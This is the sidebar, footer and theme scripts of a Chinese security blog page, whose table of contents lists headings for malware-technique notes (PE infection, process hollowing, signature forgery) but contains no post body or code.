fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Monoceros406" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:monoceros406@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://monoceros406.github.io/atom.xml" target="_blank" title=""><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">QQ:1295625063（不找对象）</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BC%8F%E5%89%8D%E7%BA%BF%E6%88%98%E6%9C%AF%E6%8C%87%E5%8D%97%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">恶意程式前线战术指南笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%A3%E6%A1%88%E6%98%A0%E5%B0%84"><span class="toc-number">1.1.</span> <span class="toc-text">档案映射</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PE%E8%A0%95%E8%99%AB%E6%84%9F%E6%9F%93"><span class="toc-number">1.1.1.</span> <span class="toc-text">PE蠕虫感染</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E7%BB%93%E5%99%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">连结器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Process-Hollowing"><span class="toc-number">1.1.3.</span> <span class="toc-text">Process Hollowing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E4%BD%8D%E7%AD%BE%E5%90%8D"><span class="toc-number">1.2.</span> <span class="toc-text">数位签名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0"><span class="toc-number">1.2.1.</span> <span class="toc-text">签名伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%82%E5%87%91%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">杂凑校验绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.3.</span> <span class="toc-text">签名扩展攻击</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/11/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-%E5%AE%89%E5%85%A8%E5%90%88%E8%A7%84/" title="安卓逆向入门-安全合规">安卓逆向入门-安全合规</a><time datetime="2024-11-11T06:44:26.000Z" title="发表于 2024-11-11 14:44:26">2024-11-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/10/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-Native%E5%B1%82%E5%85%A5%E9%97%A8/" title="安卓逆向入门-Native层入门">安卓逆向入门-Native层入门</a><time datetime="2024-11-10T08:15:05.000Z" title="发表于 2024-11-10 16:15:05">2024-11-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/09/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-Android%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/" title="安卓逆向入门-Android后端开发入门">安卓逆向入门-Android后端开发入门</a><time datetime="2024-11-09T05:24:38.000Z" title="发表于 2024-11-09 13:24:38">2024-11-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/09/Linux%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E5%85%A5%E9%97%A8/" title="Linux二进制分析入门">Linux二进制分析入门</a><time datetime="2024-11-09T05:24:04.000Z" title="发表于 2024-11-09 13:24:04">2024-11-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/28/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8-DEX%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%9D%E6%8E%A2/" title="安卓逆向入门-DEX文件格式初探">安卓逆向入门-DEX文件格式初探</a><time datetime="2024-10-28T11:03:36.000Z" title="发表于 2024-10-28 19:03:36">2024-10-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Monoceros406</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="docsearch-wrap"><div id="docsearch" style="display:none"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@docsearch/css/dist/style.min.css"/><script src="https://cdn.jsdelivr.net/npm/@docsearch/js/dist/umd/index.min.js"></script><script>(() => {
  docsearch(Object.assign({
    appId: '',
    apiKey: '',
    indexName: '',
    container: '#docsearch',
  }, null))

  const handleClick = () => {
    document.querySelector('.DocSearch-Button').click()
  }

  const searchClickFn = () => {
    btf.addEventListenerPjax(document.querySelector('#search-button > .search'), 'click', handleClick)
  }

  searchClickFn()
  window.addEventListener('pjax:complete', searchClickFn)
})()</script></div></div></body></html>